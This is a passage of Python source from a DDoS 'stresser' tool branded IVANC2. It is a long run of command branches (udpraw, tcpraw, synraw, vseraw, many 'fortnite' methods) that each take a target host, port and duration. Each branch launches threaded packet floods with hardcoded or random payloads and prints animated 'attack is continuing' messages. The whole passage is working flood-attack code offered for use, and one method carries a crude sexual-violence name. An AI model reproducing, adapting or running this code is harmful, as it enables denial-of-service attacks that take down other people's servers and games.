					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfobypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitedown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitekill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniterape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitebypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniteslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev1":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitestresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitesas":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
